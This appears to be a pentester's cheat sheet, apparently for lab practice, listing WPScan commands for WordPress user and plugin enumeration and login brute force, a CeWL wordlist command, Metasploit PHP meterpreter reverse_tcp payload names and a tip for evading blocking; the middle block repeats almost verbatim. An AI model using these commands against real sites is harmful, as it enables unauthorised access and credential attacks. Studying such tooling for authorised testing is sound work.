``bash
sudo apt install wpscan
wpscan --update -> to update the vulnerability database:
wpscan --url http://targetsite.com → To detect whether it’s a WordPress site and check for potential vulnerabilities.
User Enumeration : wpscan --url https://example/ --enumerate u
Bruteforce: wpscan --url https://example/ --passwords wordlist.txt --usernames samson

brute force attack on wordpress login:
wpscan --url http://targetsite.com --passwords /path/to/wordlist.txt --usernames admin
wpscan --url <url> -P <Passwords.txt> -U <Users.txt> 

Important Options :
`-e u   (enumerates usernames)`
`-e p   (enumerates plugins)`
`-e t   (enumerates themes)`
`-e ap  (enumerates all plugins)`
`-e at  (enumerates all themes)`
`-e dbe (enumerates database exports)`
`-e vp  (enumerates only vulnerable plugins)`
`-e vt  (enumerates only vulnerable themes)`
`-e cb  (enumerates config backups)`
`-e x   (enumerates all)`

# Cewl
cewl -d 5 -w cewlfile.txt http:/IP/

# Paylods options
```bash
php/meterpreter/reverse_tcp → staged (downloads a second stage)
php/meterpreter_reverse_tcp → stageless (sends everything at once)

If 1st one not works use 2nd payload
The stageless payload often works better in lab environments

Tips:
always update the database before scanning
use --random-user-agent to avoid being blocked

```

#### Additional
```bash
sudo apt install wpscan
wpscan --update -> to update the vulnerability database:
wpscan --url http://targetsite.com → To detect whether it’s a WordPress site and check for potential vulnerabilities.
User Enumeration : wpscan --url https://example/ --enumerate u
Bruteforce: wpscan --url https://example/ --passwords wordlist.txt --usernames samson

brute force attack on wordpress login:
wpscan --url http://targetsite.com --passwords /path/to/wordlist.txt --usernames admin
wpscan --url <url> -P <Passwords.txt> -U <Users.txt> 

Important Options :
`-e u   (enumerates usernames)`
`-e p   (enumerates plugins)`
`-e t   (enumerates themes)`
`-e ap  (enumerates all plugins)`
`-e at  (enumerates all themes)`
`-e dbe (enumerates database exports)`
`-e vp  (enumerates only vulnerable plugins)`
`-e vt  (enumerates only vulnerable themes)`
`-e cb  (enumerates config backups)`
`-e x   (enumerates all)`

# Cewl
cewl -d 5 -w cewlfile.txt http:/IP/

Tips:
always update the database before scanning
use --random-user-agent to avoid being blocked
```
